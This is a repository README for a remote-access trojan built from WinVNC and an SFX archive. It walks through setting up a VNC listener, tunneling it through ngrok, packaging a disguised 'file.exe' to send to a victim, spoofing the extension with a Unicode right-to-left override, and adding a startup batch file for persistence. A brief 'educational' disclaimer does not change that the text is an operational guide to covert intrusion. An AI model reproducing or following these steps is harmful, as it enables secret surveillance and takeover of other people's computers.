# remote-vnc-exploit

**VNC Remote Exploit ver2**

- This is a simple exploit created using SFX archives and WinVNC. 
- This has been made for educational and demonstrational purposes to recommend the use of Firewalls for a normal user.
- **Do not use this tool without proper permission.**
- **I do not condone and am not responsible for any illegal activities conducted by the users of this tool.**


**What this tool does**

This tool simply connects the victims VNC to the link that is forwaded using ngrok. This allows you to use the VNC software as usual over the internet without the victim's knowledge.
This has been made only for demonstrational purposes. 

**Instructions:**

Note: 	You have to allow the port used in firewall, and turn off Antivirus. 
	This hasn't been properly tested yet, as it works on some PC's without turning off AV. 
	Your mileage may vary.

**About Domains**

Instead of using ngrok you can instead use [www.portmap.io](portmap.io) to create a public TCP domain that can be connected to a local port. If so simply place that link in run.bat file in Client folder (and in autorun.bat file if you use it)


Step 1:
- Go to Base folder
- Run listener.bat file
- Specify port to be used	
- Close it by pressing any key
 

Step 2: 	
- Go to Ngrok folder
- Run ngrok.bat (If you get an error here, refer to **FAQ 1**)
- Enter same port used in VNC listener
- Copy the link of forwarding, without the protocol E.g. "0.tcp.ap.ngrok.io:00000"
 

Step 3:	
- Go to client folder
- Shift + Right click  run.bat and edit it
- Enter the link after -connect and add an extra colon before the port E.g. "0.tcp.ap.ngrok.io::00000" (Make sure there is **two colons** between link and port)
- Save the file
 


Step 4:
- (The ver1 of this Exploit only supports images)
- Replace pic.png with any image you like (it must be the same name and extension)
- Replace icon.ico with any icon you like (it must be the same name and extension)
 
	
Step 5:
- Go back to Root folder
- Run archive.bat
- There should be a file called "file.exe" (If it doesn't appear refer to **FAQ 2**)
- This is the file to be sent to the victim
 

Step 6: 	
- Additional Steps
- You can spoof the file by renaming it to "filenamegnp.scr" 
- The filename can have any name you like followed by "gnp.scr" without any spaces
- Right click behind the letter G, and enter a unicode RLO character.
- If the icon gets messed up in this step, you might have to use Resource Hacker to put a new icon (Google Search on how to do it)


That's it! Now you just wait for the victim to open your file and you have full access to their computer.

**Extras Folder**
- There is an extras folder in the repo.
- To use it you need to copy all the files in Extras folder and copy to Client folder (make sure to overwrite existing files)
- These files basically add a copy of VNC software to the victims computer.
- It adds a bat file that automatically runs at windows bootup. So whenever the victim turns on the pc, you can connect to it.
- The link used by ngrok must be amended in autorun.bat file too. The ngrok link is subject to change, unless you have a static domain this will be unsuccesful. 

**FAQ 1:** 
- Go to [[www.ngrok.com](ngrok.com)](https://ngrok.com/)
- Sign in (Create account if you haven't))
- Follow the websites instructions for authorization
- Make sure to run the cmd prompt in the "Ngrok" folder

**FAQ 2:** 
- Shift + Right click archive.bat
- Change the timout time from 1 to a higher time.
- This depends on the performance of your system, if it is lower end change to a higher time and vice versa.
